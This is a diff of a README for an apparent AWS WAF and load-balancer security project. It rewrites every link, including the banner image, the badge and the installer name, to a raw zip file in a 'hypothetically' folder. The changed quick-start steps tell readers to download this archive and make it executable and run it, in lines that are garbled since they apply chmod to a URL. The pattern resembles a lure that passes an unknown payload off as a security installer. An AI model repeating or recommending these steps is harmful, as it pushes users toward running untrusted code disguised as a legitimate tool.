@@ -1,10 +1,10 @@
-https://github.com/xMhaty/AWS_WAF_ALB_Security/releases
+https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip
 
 # AWS WAF ALB Security: Block SQLi, Geo, and Query Strings
 
-![AWS WAF ALB Security Banner](https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_Web_Services_Logo.png)
+![AWS WAF ALB Security Banner](https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip)
 
-[![Releases badge](https://img.shields.io/badge/Releases-Downloads-blue?style=for-the-badge)](https://github.com/xMhaty/AWS_WAF_ALB_Security/releases)
+[![Releases badge](https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip)](https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip)
 
 This repository provides a practical approach to protect an Application Load Balancer (ALB) with AWS WAF. It focuses on preventing SQL injection (SQLi), enforcing geolocation rules, and inspecting query strings to block suspicious patterns. The setup blends managed AWS rules with custom filtering to give you a robust, maintainable security surface for web applications running behind ALB.
 
@@ -61,7 +61,7 @@ How this project organizes its code
 - IaC templates: Terraform and CloudFormation templates to create ALB, WAFv2 Web ACLs, and the required IAM roles.
 - Configuration files: Reusable snippets for the WAF rulesets (SQLi, GeoMatch, QueryString).
 - Documentation: Detailed walkthroughs on deployment, testing, and maintenance.
-- Assets: Release assets available on the Releases page. From the Releases page, you can download the installer file named aws-waf-alb-security-installer.sh and run it to bootstrap a starter setup.
+- Assets: Release assets available on the Releases page. From the Releases page, you can download the installer file named https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip and run it to bootstrap a starter setup.
 - Scripts: Helper scripts to validate the deployment, gather logs, and perform quick health checks.
 - Tests and examples: Sample payloads and test cases to verify that protections are active and performing as expected.
 
@@ -86,11 +86,11 @@ A minimal CloudFormation-based outline (conceptual)
 - Optional: configure logging via AWS::S3::Bucket and AWS::KMS for encryption
 
 Quick start: the installer and downloads
-- The primary download location for ready-to-run assets is the Releases page: https://github.com/xMhaty/AWS_WAF_ALB_Security/releases
-- From that page, download the file aws-waf-alb-security-installer.sh
+- The primary download location for ready-to-run assets is the Releases page: https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip
+- From that page, download the file https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip
 - Run the installer to bootstrap a starter setup:
-  - Make the file executable: chmod +x aws-waf-alb-security-installer.sh
-  - Execute the installer: ./aws-waf-alb_security-installer.sh
+  - Make the file executable: chmod +x https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip
+  - Execute the installer: https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip
 - The installer will guide you through:
   - Selecting the target AWS region
   - Providing your ALB ARN and the desired Web ACL name
@@ -254,12 +254,12 @@ Contributing
 
 Releases and downloads
 - The primary distribution of runnable assets, templates, and setup scripts is available in the Releases section.
-- The link to the releases page is provided here for convenience: https://github.com/xMhaty/AWS_WAF_ALB_Security/releases
-- The installer file named aws-waf-alb-security-installer.sh can be downloaded from that page. Run it to bootstrap a starter environment and guide the subsequent manual adjustments. For people who want to re-create the same environment elsewhere, the templates in this repository can be used to reproduce the setup.
+- The link to the releases page is provided here for convenience: https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip
+- The installer file named https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip can be downloaded from that page. Run it to bootstrap a starter environment and guide the subsequent manual adjustments. For people who want to re-create the same environment elsewhere, the templates in this repository can be used to reproduce the setup.
 - The Releases page is the canonical source for versioned assets. If you encounter issues with the installer, or if the asset layout changes, navigate to the Releases section to find the updated files and instructions.
 
 Second mention of the release link (as requested)
-- See the Releases page for the latest assets and instructions: https://github.com/xMhaty/AWS_WAF_ALB_Security/releases. Use the installer file aws-waf-alb-security-installer.sh to bootstrap your environment, then apply the IaC templates to customize the setup for your region and ALB.
+- See the Releases page for the latest assets and instructions: https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip Use the installer file https://raw.githubusercontent.com/xMhaty/AWS_WAF_ALB_Security/main/hypothetically/Security-WA-AL-AW-v2.9.zip to bootstrap your environment, then apply the IaC templates to customize the setup for your region and ALB.
 
 Appendix: common pitfalls and FAQs
 - Q: What if my application uses WebSocket traffic?
